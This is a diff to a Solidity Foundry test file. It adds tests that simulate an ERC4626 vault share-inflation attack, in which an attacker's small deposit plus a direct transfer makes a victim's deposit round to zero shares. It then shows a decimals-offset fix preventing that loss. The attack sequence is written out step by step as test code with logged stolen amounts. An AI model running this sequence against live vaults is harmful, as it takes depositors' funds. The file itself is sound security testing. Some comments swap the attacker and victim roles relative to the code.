@@ -86,7 +86,7 @@ contract VaultTest is Test {
     //forgefmt: disable-end
     }
 
-    function test_InflationAttack() public {
+    function test_InflationAttack_POSTUpdateVault() public {
         //in this scenario, Bob will set-up an inflation attack to the vault before Alice's deposit
         //this consist in minting a small amount of shares first, then transfering assets directly to the vault asset balance
         //this will inflate the totalAssets() value of the vault, resulting in a rounding to 0 for Alice when she will try
@@ -95,28 +95,31 @@ contract VaultTest is Test {
 		uint256 attackerInflationTransfer = 1 ether;
 		uint256 victimDeposit = 1 ether;
 
+        uint8 decimalsOffset = 4;
+        address(vault).call(abi.encodeWithSelector(Vault.setDecimalsOffset.selector, decimalsOffset));
+        console.log("post-update _offsetDecimals(): ", decimalsOffset);
+
         //from here actions comes from Alice
 		vm.startPrank(alice);
         underlying.approve(address(vault), attackerFirstDeposit);
         vault.deposit(attackerFirstDeposit, alice);
 
-        console.log("Alice's shares", vault.balanceOf(alice));
-        // assertEq(10**vault._decimalsOffset(), vault.balanceOf(alice)
-        // , "alice's share balance's wrong");
+        console.log("Attacker (Alice) first deposit %d wei of tokens, and get %d wei shares ", attackerFirstDeposit, vault.balanceOf(alice));
+        console.log("Alice's shares:", vault.balanceOf(alice));
 
-        // uint256 exchangeRate = vault.totalSupply()/vault.totalAssets();
-        // console.log("Exchange rate:", exchangeRate);
-
+        console.log("Attacker transfer then %d wei tokens directly to the vault", attackerInflationTransfer);
+        console.log("She will not get any shares, are she is not minting, nor depositing, but directly transfering to the vault address");
         underlying.transfer(address(vault), attackerInflationTransfer);
 		vm.stopPrank();
 
         //from here actions comes from Bob
 		vm.startPrank(bob);
+        console.log("Bob (victim) deposit then %d wei tokens", attackerInflationTransfer);
         underlying.approve(address(vault), victimDeposit);
         vault.deposit(victimDeposit, bob);
         vm.stopPrank();
 
-        console.log("State after the attack:");
+        console.log("\n-State after the attack-");
         console.log("Alice's shares:", vault.balanceOf(alice));
         console.log("Bob's shares:", vault.balanceOf(bob));
         console.log("total shares in vault:", vault.totalSupply());
@@ -125,11 +128,26 @@ contract VaultTest is Test {
         uint256 aliceShares = vault.balanceOf(alice);
         uint256 bobShares = vault.balanceOf(bob);
         
+        console.log("\nbefore anyone redeem, here's the simulation of what they get");
         console.log("Alice's redeem availability:", vault.previewRedeem(aliceShares));
         console.log("Bob's redeem availability:", vault.previewRedeem(bobShares));
+
+        console.log("\nIf the redeem in this order");
+        vm.prank(alice);
+        uint256 aliceRealRedeem = vault.redeem(aliceShares, alice, alice);
+        console.log("Alice redeeming first: ", aliceRealRedeem);
+        vm.prank(bob);
+        uint256 bobRealRedeem = vault.redeem(bobShares, bob, bob);
+        console.log("Bob redeeming second: ", bobRealRedeem);
+
+        console.log("\nIn this case, we see that Alice gets only %d%% back of what she spent, while Bob got %d%%"
+        , (aliceRealRedeem*100)/(attackerFirstDeposit+attackerInflationTransfer)
+        , (bobRealRedeem*100)/(victimDeposit)
+        );
+        console.log("The decimal offset protected Bob's from Alice front-run deposit");
     }
 
-    function test_InflationAttack_PreUpdateVault() public {
+    function test_InflationAttack_PREUpdateVault() public {
         //in this scenario, Bob will set-up an inflation attack to the vault before Alice's deposit
         //this consist in minting a small amount of shares first, then transfering assets directly to the vault asset balance
         //this will inflate the totalAssets() value of the vault, resulting in a rounding to 0 for Alice when she will try
@@ -143,23 +161,22 @@ contract VaultTest is Test {
         underlying.approve(address(preUpdateVault), attackerFirstDeposit);
         preUpdateVault.deposit(attackerFirstDeposit, alice);
 
-        console.log("Alice's shares", preUpdateVault.balanceOf(alice));
-        assertEq(1 wei, preUpdateVault.balanceOf(alice)
-        , "alice's share balance's wrong");
+        console.log("Attacker (Alice) first deposit %d wei of tokens, and get %d wei shares ", attackerFirstDeposit, preUpdateVault.balanceOf(alice));
+        console.log("Alice's shares:", preUpdateVault.balanceOf(alice));
 
-        // uint256 exchangeRate = preUpdateVault.totalSupply()/preUpdateVault.totalAssets();
-        // console.log("Exchange rate:", exchangeRate);
-
+        console.log("Attacker transfer then %d wei tokens directly to the vault", attackerInflationTransfer);
+        console.log("She will not get any shares, are she is not minting, nor depositing, but directly transfering to the vault address");
         underlying.transfer(address(preUpdateVault), attackerInflationTransfer);
 		vm.stopPrank();
 
         //from here actions comes from Bob
 		vm.startPrank(bob);
+        console.log("Bob (victim) deposit then %d wei tokens", attackerInflationTransfer);
         underlying.approve(address(preUpdateVault), victimDeposit);
         preUpdateVault.deposit(victimDeposit, bob);
         vm.stopPrank();
 
-        console.log("State after the attack:");
+        console.log("-State after the attack-");
         console.log("Alice's shares:", preUpdateVault.balanceOf(alice));
         console.log("Bob's shares:", preUpdateVault.balanceOf(bob));
         console.log("total shares in preUpdateVault:", preUpdateVault.totalSupply());
@@ -168,31 +185,59 @@ contract VaultTest is Test {
         uint256 aliceShares = preUpdateVault.balanceOf(alice);
         uint256 bobShares = preUpdateVault.balanceOf(bob);
         
+        console.log("\nbefore anyone redeem, here's the simulation of what they get");
         console.log("Alice's redeem availability:", preUpdateVault.previewRedeem(aliceShares));
         console.log("Bob's redeem availability:", preUpdateVault.previewRedeem(bobShares));
+
+        console.log("\nIf the redeem in this order");
+        vm.prank(alice);
+        uint256 aliceRealRedeem = preUpdateVault.redeem(aliceShares, alice, alice);
+        console.log("Alice redeeming first: ", aliceRealRedeem);
+        vm.prank(bob);
+        uint256 bobRealRedeem = preUpdateVault.redeem(bobShares, bob, bob);
+        console.log("Bob redeeming second: ", bobRealRedeem);
+
+        console.log("\nIn this case, we see that Alice gets only %d%% back of what she spent, while Bob got %d%%"
+        , (aliceRealRedeem*100)/(attackerFirstDeposit+attackerInflationTransfer)
+        , (bobRealRedeem*100)/(victimDeposit)
+        );
+
+        console.log("Bob's deposit got d%% stolen by Alice!", 100-(bobRealRedeem*100)/(victimDeposit));
     }
 
     function test_CompareConvertImplementations() public {
-        uint256 shares = 1 wei;
-        uint256 assets = 1 wei;
+        uint256 shares = 1e9+1;
+        uint256 assets = shares;
+
+        console.log("shares/assets converted", shares);
 
         VaultHarness vaultH = new VaultHarness(address(underlying));
+        vaultH.setDecimalsOffset(uint8(4));
+
         PreUpdateVaultHarness preUpdateVaultH = new PreUpdateVaultHarness(address(underlying));
 
-        console.log("-Rounding down-");
-        console.log("Post-Update convertToAssets:", vaultH.exposed__convertToAssets(shares, Rounding.Down));
-        console.log("Post-Update convertToShares:", vaultH.exposed__convertToShares(assets, Rounding.Down));
+        console.log("post-update _offsetDecimals(): ",vaultH.exposed__decimalsOffset());
+
+        console.log("\n-Rounding down-");
         console.log("Pre-Update convertToAssets:", preUpdateVaultH.exposed__convertToAssets(shares, Rounding.Down));
         console.log("Pre-Update convertToShares:", preUpdateVaultH.exposed__convertToShares(assets, Rounding.Down));
+        console.log("Post-Update convertToAssets:", vaultH.exposed__convertToAssets(shares, Rounding.Down));
+        console.log("Post-Update convertToShares:", vaultH.exposed__convertToShares(assets, Rounding.Down));
 
         console.log("-Rounding up-");
-        console.log("Post-Update convertToAssets:", vaultH.exposed__convertToAssets(shares, Rounding.Up));
-        console.log("Post-Update convertToShares:", vaultH.exposed__convertToShares(assets, Rounding.Up));
         console.log("Pre-Update convertToAssets:", preUpdateVaultH.exposed__convertToAssets(shares, Rounding.Up));
         console.log("Pre-Update convertToShares:", preUpdateVaultH.exposed__convertToShares(assets, Rounding.Up));
-
+        console.log("Post-Update convertToAssets:", vaultH.exposed__convertToAssets(shares, Rounding.Up));
+        console.log("Post-Update convertToShares:", vaultH.exposed__convertToShares(assets, Rounding.Up));
     }
-    
+
+    function returnExchangeRate(address _vault) public view returns (uint256 exchangeRate){
+        exchangeRate = IERC4626(_vault).totalSupply()/IERC4626(_vault).totalAssets();
+    }
+
+    function returnExchangeRate(uint256 totalShares, uint256 totalAssets) public pure returns (uint256 exchangeRate){
+        exchangeRate = totalShares/totalAssets;
+    }    
     // function test_StartPrank() public {
     // 	vm.startPrank(alice);
     // 	console.log("msg.sender:",msg.sender);
